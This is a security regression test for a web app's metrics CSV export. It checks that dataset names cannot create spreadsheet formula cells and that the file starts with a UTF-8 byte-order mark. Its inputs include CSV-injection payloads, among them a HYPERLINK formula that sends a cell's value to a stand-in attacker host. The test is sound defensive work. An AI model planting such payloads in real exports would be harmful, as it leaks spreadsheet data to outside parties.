// @vitest-environment jsdom
/** Security regression (audit report-04, report-15): the metrics CSV keeps user text
 *  (dataset name, settings) inside one quoted cell, so no cell can start a formula,
 *  and the file starts with a UTF-8 byte-order mark for Excel. */
import { it, expect } from 'vitest'
import { render, screen, fireEvent, waitFor, cleanup } from '@testing-library/react'
import { useApp } from '../../src/store/store'
import { parseProjectFile } from '../../src/store/projectLoad'
import App from '../../src/App'

/** RFC 4180 reader, quoted separators and newlines included (what a spreadsheet does). */
function rows(text: string): string[][] {
  const out: string[][] = []; let row: string[] = []; let cur = ''; let q = false;
  for (let i = 0; i < text.length; i++) {
    const ch = text[i];
    if (q) { if (ch === '"' && text[i + 1] === '"') { cur += '"'; i++; } else if (ch === '"') q = false; else cur += ch; }
    else if (ch === '"' && cur === '') q = true;
    else if (ch === ',') { row.push(cur); cur = ''; }
    else if (ch === '\n') { row.push(cur); out.push(row); row = []; cur = ''; }
    else cur += ch;
  }
  row.push(cur); out.push(row); return out;
}

async function exportFor(name: string): Promise<string> {
  cleanup();
  const n = 60, t0 = Date.UTC(2006, 0, 1);
  const dates = Array.from({ length: n }, (_, i) => t0 + i * 864e5);
  const obs = dates.map((_, i) => 6 + Math.sin(i / 5));
  const file = {
    schemaVersion: 1,
    datasets: [{
      name, dates, observed: { name: 'obs', values: obs, inputUnit: 'm3s' },
      runs: [{ name: '=sim', values: obs.map((_v, i) => 6 + Math.sin((i - 2) / 5)), inputUnit: 'm3s', visible: true }],
      targetUnit: 'm3s', location: null, area: null, view: { activeTab: 'metrics' },
    }],
  };
  useApp.getState().loadProject(parseProjectFile(JSON.stringify(file)).project);
  const blobs: Blob[] = [];
  const orig = URL.createObjectURL;
  (URL as any).createObjectURL = (b: Blob) => { blobs.push(b); return 'blob:capture'; };
  try {
    render(<App />);
    const btn = await screen.findByRole('button', { name: /export csv/i }, { timeout: 5000 });
    await waitFor(() => expect((btn as HTMLButtonElement).disabled).toBe(false), { timeout: 10000 });
    fireEvent.click(btn);
    await waitFor(() => expect(blobs.length).toBeGreaterThan(0));
    const bytes = new Uint8Array(await blobs[0].arrayBuffer());
    const bom = bytes[0] === 0xef && bytes[1] === 0xbb && bytes[2] === 0xbf;
    return (bom ? 'BOM' : '') + new TextDecoder('utf-8', { ignoreBOM: true }).decode(bytes.subarray(bom ? 3 : 0));
  } finally { (URL as any).createObjectURL = orig; }
}

it('report-04/report-15: no formula cells from user text; UTF-8 BOM first', async () => {
  for (const name of ['Nith River,=HYPERLINK("https://evil.example/"),', 'Speed River\n=HYPERLINK("https://evil.example/?q="&D8),']) {
    const text = await exportFor(name);
    expect(text.startsWith('BOM')).toBe(true);
    const cells = rows(text.slice(3)).flat();
    const formulas = cells.filter(c => /^[=+@]/.test(c) || (/^-/.test(c) && !/^-?\d/.test(c)));
    expect(formulas).toEqual([]);
    expect(cells.some(c => c.includes('HYPERLINK'))).toBe(true);   // kept, but inert inside a comment cell
  }
}, 30000);
